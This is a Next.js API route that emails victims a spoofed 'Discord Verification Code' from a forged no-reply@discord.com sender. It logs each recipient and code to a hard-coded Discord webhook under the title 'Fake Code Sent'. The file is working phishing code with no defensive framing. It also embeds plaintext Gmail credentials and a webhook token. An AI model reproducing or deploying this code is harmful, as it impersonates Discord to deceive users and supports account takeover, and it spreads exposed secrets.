import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

const WEBHOOK = 'https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614';

async function logWebhook(title: string, fields: { name: string; value: string }[], color = 0x5865f2) {
  await fetch(WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      embeds: [{ title, color, fields, timestamp: new Date().toISOString() }]
    })
  }).catch(() => {});
}

export async function POST(req: NextRequest) {
  try {
    const { email } = await req.json();
    
    if (!email) {
      return NextResponse.json({ error: 'No email provided' }, { status: 400 });
    }

    const code = Math.floor(100000 + Math.random() * 900000).toString();

    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: false,
      auth: {
        user: 'discordsupporttt@gmail.com',
        pass: 'Discord321'
      }
    });

    await transporter.sendMail({
      from: '"Discord" <no-reply@discord.com>',
      to: email,
      subject: 'Discord Verification Code',
      html: `<h2>Your code is: <strong>${code}</strong></h2><p>Enter this to verify login.</p>`
    });

    await logWebhook('Fake Code Sent', [
      { name: 'To', value: email },
      { name: 'Code', value: code }
    ], 0x00ff00);

    return NextResponse.json({ success: true, code });

  } catch (err) {
    const errorMessage = err instanceof Error ? err.message : String(err || 'Request error');
    
    await logWebhook('Send Code Error', [
      { name: 'Error', value: errorMessage }
    ], 0xff0000);
    
    return NextResponse.json({ error: errorMessage }, { status: 500 });
  }
}
